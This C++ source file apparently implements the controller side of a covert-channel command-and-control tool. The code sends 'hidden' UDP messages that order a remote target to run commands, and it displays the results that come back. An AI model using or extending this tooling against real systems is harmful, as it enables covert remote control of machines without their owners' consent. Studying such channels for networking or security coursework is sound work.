#include "1cnc_channel.h"
#include "utilities.h"

#include <tins/tins.h>
#include <iostream>
#include <string>
#include <thread>

using std::cout;
using std::endl;
using std::string;
using namespace Tins;

CNc_Channel::CNc_Channel()
{

}

void CNc_Channel::start(string ip, int port, string interface, int l_port) {

    config.target_addr.ip = ip;
    config.target_addr.port = port;
    config.interface = interface;
    config.listen_port = l_port;
    //detach a thread then return to gui
    std::thread(&Covert_Channel::setup, this).detach();
}

bool CNc_Channel::parse_command(Job& j){
    cout << "parse_command [start] " << endl;
    CMD cmd;
    try{
        cmd = cmdMap.right.find(j.command)->second;
    }
    catch(...){
        cout << "parse_command [failed] " << endl;
        return false;
    }

    switch(cmd) {
        case CMD::ret_cmd :
           handle_ret_cmd(j);
           break; //optional
        case CMD::ret_file :
            //handle_get_file(command_arg);
            break; //optional
        default :
            cout << "parse_command default switch case " << endl;
            return false;
    }
    return true;
}

bool CNc_Channel::handle_ret_cmd(Job& j){
    emit appendText(j.argument);
    return true;
}


bool CNc_Channel::send_run_cmd(string cmd){
    string request;
    request += '[';
    request += cmdMap.left.find(CMD::run_cmd)->second;
    request += ']';
    request += cmd;
    std::vector<unsigned char> hidden(request.begin(), request.end());
    udp_send(config.target_addr.ip, config.target_addr.port, hidden);
    return true;
}

